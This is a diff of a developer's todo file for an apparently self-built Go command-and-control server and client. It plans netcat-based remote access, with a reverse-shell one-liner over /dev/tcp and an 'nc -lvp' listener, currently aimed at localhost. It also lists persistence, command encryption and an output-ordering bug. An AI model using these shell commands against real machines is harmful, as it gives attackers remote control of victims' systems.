@@ -1,15 +1,35 @@
 # Todo
 
-- Working on `execCommand`, next is to send to client the command, execute and then wait for the response
-    - This is working, next step is to wait for commands in client and printf those to see if its working (DONE)
-    - Next is to understand why the client is only receiving the `use` command from the server instead of the correct command (DONE)
-    - Next is to execute that command in client (DONE)
-    - Next is to create web app in server that receives POST requests from client (DONE)
-    - Next is to get the real command from the server + the output from the client + the timestamp and save that on the database when making the POST (check `respondToServer` on client.go)
-    - Next is to encode the command and the result into b64
+- Ill implement a netcat connection instead of creating a shell because thats a lot of work for no reason
+    - The idea is that the client will receive a "getShell" string and will connect to a nc connection from the server `sh -i >& /dev/tcp/127.0.0.1/4444 0>&1` (`getCommands` function)
+    - In the server, he will be waiting for a nc connection from the client IP (localhost for now) `nc -lvp 4444`
+    - For now this is a rev shell but the ideal was a bind shell , this way the client would wait for a connection from the server
 
 - Server could exit but clients should continue running and when server starts again, goes check what clients are still on
 
 - Implement mutexes to control goroutines
 
 - Implement command encription on server and command decription on client with one time key given on c2 server startup
+
+## Bugs
+
+- Bug when using a client because the output of the command goes after the next input (@bug1)
+    - This is bad
+        ```
+        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) > ls
+
+        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) >
+        go.mod
+        go.sum
+        main.go
+        ```
+
+    - This is good
+        ```
+        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) > ls
+        go.mod
+        go.sum
+        main.go
+
+        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) >
+        ```
